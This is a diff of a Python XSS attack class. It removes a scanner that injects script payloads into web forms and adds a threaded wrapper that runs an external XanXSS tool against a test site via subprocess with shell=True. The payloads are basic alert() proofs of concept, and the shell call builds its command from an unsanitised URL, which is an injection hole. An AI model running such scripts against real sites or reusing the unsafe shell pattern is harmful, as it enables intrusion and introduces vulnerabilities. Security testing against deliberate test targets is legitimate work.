@@ -2,12 +2,13 @@ import requests
 from bs4 import BeautifulSoup
 import logging
 from urllib.parse import urljoin
+import threading
 
 logging.basicConfig(level=logging.INFO)
 
 
 class XSSAttack:
-    def __init__(self, url):
+    def __init__(self, url, num_attacks=1, attack_type="xanxxs"):
         self.url = url
         self.session = requests.Session()
         self.payloads = [
@@ -15,55 +16,44 @@ class XSSAttack:
             "<img src=x onerror=alert(1)>",
             "<script>alert(1);</script>",
         ]
+        self.threads = []
+        self.num_attacks = num_attacks
+        self.attack_type = attack_type
 
-    def get_all_forms(self):
-        """Return all form tags on the webpage."""
-        soup = BeautifulSoup(self.session.get(self.url).content, "html.parser")
-        return soup.find_all("form")
+    def create_attacks(self):
+        for _ in range(self.num_attacks):
+            thread = threading.Thread(target=self.run_attack)
+            self.threads.append(thread)
+            thread.start()
 
-    def get_form_details(self, form):
-        """Extract all possible useful information about an HTML form."""
-        details = {}
-        action = form.attrs.get("action").lower()
-        method = form.attrs.get("method", "get").lower()
+    def run_attack(self):
+        if self.attack_type == "xanxxs":
+            self.xanxxs_attack()
+        elif self.attack_type == "b33f":
+            self.b33f_attack()
+        else:
+            logging.error(f"Unknown attack type: {self.attack_type}")
 
-        # absolute action URL
-        details["action"] = urljoin(self.url, action)
-        details["method"] = method
+    def xanxxs_attack(self):
+        command = f"python3 XanXSS/xanxss.py -u {self.url}"
+        import subprocess
+        subprocess.run(command, shell=True)
+        
+        
 
-        # get all form inputs
-        inputs = []
-        for input_tag in form.find_all("input"):
-            input_type = input_tag.attrs.get("type", "text")
-            input_name = input_tag.attrs.get("name")
-            inputs.append({"type": input_type, "name": input_name})
+    def b33f_attack(self):
+        # TODO: Implement the b33f attack here
+        raise NotImplementedError
 
-        details["inputs"] = inputs
-        return details
+    def wait_for_threads(self):
+        for thread in self.threads:
+            thread.join()
 
-    def is_vulnerable(self, response):
-        """Check if the payload is reflected in the response."""
-        for payload in self.payloads:
-            if payload in response.content.decode():
-                return True
-        return False
 
-    def attack(self, form_details):
-        """Given a dictionary of form details, send requests with each type of
-        XSS payload."""
-        for payload in self.payloads:
-            data = {}
-            for input_tag in form_details["inputs"]:
-                if input_tag["type"] == "text" or input_tag["type"] == "search":
-                    data[input_tag["name"]] = payload
+# Target URL
+target_url = "http://testphp.vulnweb.com"
 
-            if form_details["method"] == "post":
-                response = self.session.post(form_details["action"], data=data)
-            else:  # method == 'get'
-                response = self.session.get(form_details["action"], params=data)
-
-            if self.is_vulnerable(response):
-                logging.info(
-                    "Possible XSS vulnerability found in form"
-                    f" {form_details['action']}. Payload: {payload}"
-                )
+# Create and launch attack
+attack = XSSAttack(target_url, num_attacks=1, attack_type="xanxxs")
+attack.create_attacks()
+attack.wait_for_threads()
